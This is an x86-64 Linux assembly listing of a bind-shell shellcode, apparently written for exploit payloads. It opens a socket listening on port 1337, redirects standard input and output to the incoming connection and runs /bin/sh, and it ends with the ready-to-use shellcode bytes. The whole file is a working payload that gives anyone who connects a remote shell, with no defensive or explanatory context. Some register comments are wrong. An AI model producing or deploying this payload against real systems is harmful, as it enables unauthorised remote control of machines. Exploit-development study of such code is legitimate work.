global _start

_start:
    ; socket(2, 1, 0);
    push 0x29                    ; socket()
    pop rax                      ; $rax = socket()

    push 0x2                     ; AF_INET
    pop rdi                      ; $rbx = AF_INET

    push 0x1                     ; SOCK_STREAM
    pop rsi                      ; $rcx = SOCK_STREAM

    cdq                          ; $edx = 0x0

    syscall                      ; syscall

    ; bind(s, [2, 1337, 0], 16);
    xchg edi, eax                ; $rdi = descriptor

    push rdx                     ; "0.0.0.0"

    mov word [rsp + 0x2], 0x3905 ; 1337
    mov byte [rsp], 0x2          ; AF_INET

    mov rsi, rsp                 ; sockaddr_in

    mov dl, 0x10                 ; len struct

    mov al, 0x31                 ; $rax = bind()
    syscall                      ; syscall

    ; listen(s, 0);
    xor rsi, rsi                 ; $rsi = 0x0

    mov al, 0x32                 ; $rax = listen()

    syscall                      ; syscall

    ; accept(s, 0);
    mov al, 0x2b                 ; $rax = accept()

    syscall                      ; syscall

    ; dup2(clientfd, fd);
    xchg edi, eax

    push 0x2                     ; counter
    pop rsi                      ; $ecx = counter

    .loop:
        mov al, 0x21     ; $eax = dup2()
        syscall          ; syscall

        dec esi          ; $rcx -= 1
        jns .loop        ; if ecx != 0

        ; execve("/bin/sh", NULL, NULL);
        mov al, 0x3b     ; $eax = execve()

        inc esi                     ; $rsi = NULL
        push rsi                    ; "\x00"

        mov rdi, 0x68732f2f6e69622f ; "/bin//sh"
        push rdi                    ; "/bin//sh\x00"
        push rsp                    ; "/bin/sh\x00"
        pop rdi                     ; $rdi = "/bin//sh"

        cdq                         ; $rdx = NULL

        syscall                     ; syscall

; shellcode = b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x97\x52\x66\xc7\x44\x24\x02\x05\x39\xc6\x04\x24\x02\x48\x89\xe6\xb2\x10\xb0\x31\x0f\x05\x48\x31\xf6\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x97\x6a\x02\x5e\xb0\x21\x0f\x05\xff\xce\x79\xf8\xb0\x3b\xff\xc6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x99\x0f\x05"
